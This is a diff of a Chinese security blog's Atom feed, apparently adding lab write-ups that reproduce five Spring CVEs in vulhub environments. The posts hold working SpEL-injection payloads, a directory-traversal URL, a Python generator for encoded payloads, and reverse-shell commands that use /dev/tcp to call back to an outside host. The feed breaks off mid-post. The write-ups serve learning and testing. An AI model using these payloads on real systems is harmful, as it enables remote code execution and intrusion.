@@ -6,7 +6,7 @@
   <link href="https://hzktester.top/atom.xml" rel="self"/>
   
   <link href="https://hzktester.top/"/>
-  <updated>2020-09-28T01:44:55.995Z</updated>
+  <updated>2020-09-29T09:07:18.587Z</updated>
   <id>https://hzktester.top/</id>
   
   <author>
@@ -15,6 +15,139 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Spring Cloud Config 目录穿越漏洞复现（CVE-2020-5410）</title>
+    <link href="https://hzktester.top/2020/09/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Cloud%20Config%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2020-5410%EF%BC%89/"/>
+    <id>https://hzktester.top/2020/09/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Cloud%20Config%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2020-5410%EF%BC%89/</id>
+    <published>2020-09-29T09:30:00.000Z</published>
+    <updated>2020-09-29T09:07:18.587Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Spring Cloud Config 为分布式系统中的外部配置提供服务器和客户端支持，使用 Config Server ，用户可以在所有环境中管理应用程序的外部属性。<br>近日，百度云安全团队监测到 Spring Cloud Config 官方发布了一个目录遍历漏洞的风险通告，漏洞编号为 CVE-2020-5410 。攻击者可通过构造特殊的 HTTP 请求，从而跨目录读取文件。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>2.2.x&lt;=2.2.2 2.1.x&lt;=2.1.8</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用vulfocus启动漏洞环境</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092923.png" alt="image"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问<br><code>http://47.101.62.20:48259/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Ftmp%23foo/development</code></p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092924.png" alt="image"></p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;Spring Cloud Config 为分布式系统中的外部配置提供服务器和客户端支持，使用 Config Server ，用户可以在所有环境中管理应用程序的外部属性。&lt;br&gt;近日，百度云安全团队监测到 Spring Cloud Config 官方发布了一个目录遍历漏洞的风险通告，漏洞编号为 CVE-2020-5410 。攻击者可通过构造特殊的 HTTP 请求，从而跨目录读取文件。&lt;/p&gt;
+&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;2.2.x&amp;lt;=2.2.2 2.1.x&amp;lt;=2.1.8&lt;/p&gt;
+&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;p&gt;使用vulfocus启动漏洞环境&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092923.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
+&lt;h2 id=&quot;漏洞复现&quot;&gt;&lt;a href=&quot;#漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;漏洞复现&quot;&gt;&lt;/a&gt;漏洞复现&lt;/h2&gt;&lt;p&gt;直接访问&lt;br&gt;&lt;code&gt;http://47.101.62.20:48259/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Ftmp%23foo/development&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092924.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="漏洞复现" scheme="https://hzktester.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+    <category term="Spring" scheme="https://hzktester.top/tags/Spring/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）</title>
+    <link href="https://hzktester.top/2020/09/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Data%20Commons%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-1273%EF%BC%89/"/>
+    <id>https://hzktester.top/2020/09/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Data%20Commons%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-1273%EF%BC%89/</id>
+    <published>2020-09-29T09:02:00.000Z</published>
+    <updated>2020-09-29T09:02:57.030Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Spring Data Commons 1.13 - 1.13.10(Ingalls SR10)</p><p>Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)</p><p>Spring Data Commons 2.0 - 2.0.5 (Kay SR5)</p><p>Spring Data REST 3.0 - 3.0.5 (Kay SR5)</p><p>已不支持的旧版本</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;vulhub&#x2F;spring&#x2F;CVE-2018-1273&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>稍等一会，环境启动后，访问<code>http://your-ip:8080/users</code>，将可以看到一个用户注册页面。</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092917.png" alt="image"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>填写信息，点击<code>Register user</code> 然后抓包</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092918.png" alt="image"></p><p>修改<code>username</code>参数POC并发包:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;touch &#x2F;tmp&#x2F;success&quot;)]&#x3D;</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092919.png" alt="image"></p><p>进入docker容器查看：</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092920.png" alt="image"></p><p>修改poc为反弹shell：<br>还是先base64编码，再url编码后发包:</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092921.png" alt="image"></p><p>反弹shell成功：</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092922.png" alt="image"></p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。&lt;/p&gt;
+&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Spring Data Commons 1.13 - 1.13.10(Ingalls SR10)&lt;/p&gt;
+&lt;p&gt;Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)&lt;/p&gt;
+&lt;p&gt;Spring Data Commons 2.0 - 2.0.5 (Kay SR5)&lt;/p&gt;
+&lt;p&gt;Spring Data REST 3.0 - 3.0.5 (Kay SR5)&lt;/p&gt;
+&lt;p&gt;已不支持的旧版本&lt;/p&gt;
+&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cd &amp;#x2F;vulhub&amp;#x2F;spring&amp;#x2F;CVE-2018-1273&amp;#x2F;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
+    
+    
+    
+    <category term="漏洞复现" scheme="https://hzktester.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+    <category term="Spring" scheme="https://hzktester.top/tags/Spring/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Spring Data REST PATCH 请求代码执行漏洞复现（CVE-2017-8046）</title>
+    <link href="https://hzktester.top/2020/09/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Data%20REST%20PATCH%20%E8%AF%B7%E6%B1%82%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2017-8046%EF%BC%89/"/>
+    <id>https://hzktester.top/2020/09/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Data%20REST%20PATCH%20%E8%AF%B7%E6%B1%82%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2017-8046%EF%BC%89/</id>
+    <published>2020-09-29T08:04:00.000Z</published>
+    <updated>2020-09-29T08:04:39.204Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Spring Data REST是Spring Data项目的一部分，可以轻松地在Spring Data存储库之上构建超媒体驱动的REST Web服务。</p><p>恶意的PATCH请求使用精心构造的JSON数据提交到spring-data-rest服务可以执行任意JAVA代码</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Spring Data REST versions prior to 2.5.12, 2.6.7, 3.0 RC3</p><p>可以查看spring-data-rest-webmvc jar包的版本</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;vulhub&#x2F;spring&#x2F;CVE-2017-8046&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>等待环境启动完成，然后访问<a href="http://your-ip:8080/%E5%8D%B3%E5%8F%AF%E7%9C%8B%E5%88%B0json%E6%A0%BC%E5%BC%8F%E7%9A%84%E8%BF%94%E5%9B%9E%E5%80%BC%EF%BC%8C%E8%AF%B4%E6%98%8E%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AARestful%E9%A3%8E%E6%A0%BC%E7%9A%84API%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%82">http://your-ip:8080/即可看到json格式的返回值，说明这是一个Restful风格的API服务器。</a></p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092912.png" alt="image"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>http://your-ip:8080/customers/1</code>，看到一个资源。我们使用<code>PATCH</code>请求来修改之：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PATCH &#x2F;customers&#x2F;1 HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json-patch+json</span><br><span class="line">Content-Length: 202</span><br><span class="line"></span><br><span class="line">[&#123; &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115&#125;))&#x2F;lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; &#125;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>path的值是SpEL表达式，发送上述数据包，将执行<code>new byte[]&#123;116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115&#125;</code>表示的命令<code>ouch /tmp/success</code>。</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092913.png" alt="image"></p><p>然后进入容器<code>docker exec -it 容器id /bin/bash</code>看看：</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092914.png" alt="image"></p><p>制作反弹shell的POC:</p><p>命令：<code>bash -i &gt;&amp; /dev/tcp/10.10.10.10/7777 0&gt;&amp;1</code></p><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">base64编码</a>：<code>bash -c &#123;echo,YGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTAuMTAvNzc3NyAwPiYxYA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p><p>通过下面的python代码将每个字符转为对应的十进制：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; b&#39;这里填poc&#39;</span><br><span class="line">bytecode &#x3D; &#39;,&#39;.join(str(i) for i in list(payload))</span><br><span class="line">print(bytecode)</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092915.png" alt="image"></p><p>重新发包修改为反弹shell的poc：</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092916.png" alt="image"></p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;Spring Data REST是Spring Data项目的一部分，可以轻松地在Spring Data存储库之上构建超媒体驱动的REST Web服务。&lt;/p&gt;
+&lt;p&gt;恶意的PATCH请求使用精心构造的JSON数据提交到spring-data-rest服务可以执行任意JAVA代码&lt;/p&gt;
+&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Spring Data REST versions prior to 2.5.12, 2.6.7, 3.0 RC3&lt;/p&gt;
+&lt;p&gt;可以查看spring-data-rest-webmvc jar包的版本&lt;/p&gt;
+&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cd &amp;#x2F;vulhub&amp;#x2F;spring&amp;#x2F;CVE-2017-8046&amp;#x2F;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;等待环境启动完成，然后访问&lt;a href=&quot;http://your-ip:8080/%E5%8D%B3%E5%8F%AF%E7%9C%8B%E5%88%B0json%E6%A0%BC%E5%BC%8F%E7%9A%84%E8%BF%94%E5%9B%9E%E5%80%BC%EF%BC%8C%E8%AF%B4%E6%98%8E%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AARestful%E9%A3%8E%E6%A0%BC%E7%9A%84API%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%82&quot;&gt;http://your-ip:8080/即可看到json格式的返回值，说明这是一个Restful风格的API服务器。&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092912.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="漏洞复现" scheme="https://hzktester.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+    <category term="Spring" scheme="https://hzktester.top/tags/Spring/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）</title>
+    <link href="https://hzktester.top/2020/09/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20WebFlow%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2017-4971%EF%BC%89/"/>
+    <id>https://hzktester.top/2020/09/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20WebFlow%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2017-4971%EF%BC%89/</id>
+    <published>2020-09-29T07:31:00.000Z</published>
+    <updated>2020-09-29T07:31:43.217Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Spring WebFlow 2.4.0 – 2.4.4</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;vulhub&#x2F;spring&#x2F;CVE-2017-4971&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>等待环境启动后，访问<code>http://your-ip:8080</code>，将看到一个酒店预订的页面，这是<code>spring-webflow</code>官方给的简单示例。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先访问<code>http://your-ip:8080/login</code>，用页面左边给出的任意一个账号/密码登录系统：</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092905.png" alt="image"></p><p>然后访问id为1的酒店<code>http://your-ip:8080/hotels/1</code>，点击预订按钮“Book Hotel”，填写相关信息后点击“Proceed”（从这一步，其实WebFlow就正式开始了）：</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092906.png" alt="image"></p><p>再点击确认“Confirm”，此时抓包：</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092907.png" alt="image"></p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092908.png" alt="image"></p><p>我们向其中添加一个字段（也就是反弹shell的POC）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_(new java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;21 0&gt;&amp;1&quot;)).start()&#x3D;vulhub</span><br></pre></td></tr></table></figure><p>把反弹shell的POC进行URL编码</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092909.png" alt="image"></p><p>重放数据包</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092910.png" alt="image"></p><p>成功反弹shell</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092911.png" alt="image"></p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。&lt;/p&gt;
+&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Spring WebFlow 2.4.0 – 2.4.4&lt;/p&gt;
+&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cd &amp;#x2F;vulhub&amp;#x2F;spring&amp;#x2F;CVE-2017-4971&amp;#x2F;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;等待环境启动后，访问&lt;code&gt;http://your-ip:8080&lt;/code&gt;，将看到一个酒店预订的页面，这是&lt;code&gt;spring-webflow&lt;/code&gt;官方给的简单示例。&lt;/p&gt;
+&lt;h2 id=&quot;漏洞复现&quot;&gt;&lt;a href=&quot;#漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;漏洞复现&quot;&gt;&lt;/a&gt;漏洞复现&lt;/h2&gt;&lt;p&gt;首先访问&lt;code&gt;http://your-ip:8080/login&lt;/code&gt;，用页面左边给出的任意一个账号/密码登录系统：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092905.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="漏洞复现" scheme="https://hzktester.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+    <category term="Spring" scheme="https://hzktester.top/tags/Spring/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Spring Security OAuth2 远程命令执行漏洞复现（CVE-2016-4977）</title>
+    <link href="https://hzktester.top/2020/09/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Security%20OAuth2%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2016-4977%EF%BC%89/"/>
+    <id>https://hzktester.top/2020/09/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Security%20OAuth2%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2016-4977%EF%BC%89/</id>
+    <published>2020-09-29T06:53:00.000Z</published>
+    <updated>2020-09-29T06:53:42.822Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Spring Security OAuth2处理认证请求的时候如果使用了whitelabel视图，response_type参数值会被当做Spring SpEL来执行，恶意攻击者通过构造response_type值可以触发远程代码执行漏洞 </p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用vulhub搭建漏洞环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;vulhub&#x2F;spring&#x2F;CVE-2016-4977&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>启动完成后，访问<a href="http://your-ip:8080/%E5%8D%B3%E5%8F%AF%E7%9C%8B%E5%88%B0web%E9%A1%B5%E9%9D%A2%E3%80%82">http://your-ip:8080/即可看到web页面。</a></p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Spring Security OAuth 2.3到2.3.2</p><p>Spring Security OAuth 2.2到2.2.1</p><p>Spring Security OAuth 2.1到2.1.1</p><p>Spring Security OAuth 2.0到2.0.14</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>http://your-ip:8080/oauth/authorize?response_type=$&#123;233*233&#125;&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</code>。首先需要填写用户名和密码，我们这里填入<code>admin:admin</code>即可。</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092901.png" alt="image"></p><p>对反弹shell的POC进行base64编码<br><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092902.png" alt="image"></p><p>使用<code>poc.py</code>生成反弹shell的POC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">message &#x3D; input(&#39;Enter message to encode:&#39;)</span><br><span class="line"></span><br><span class="line">poc &#x3D; &#39;$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&#39; % ord(message[0])</span><br><span class="line"></span><br><span class="line">for ch in message[1:]:</span><br><span class="line">   poc +&#x3D; &#39;.concat(T(java.lang.Character).toString(%s))&#39; % ord(ch) </span><br><span class="line"></span><br><span class="line">poc +&#x3D; &#39;)&#125;&#39;</span><br><span class="line"></span><br><span class="line">print(poc)</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092903.png" 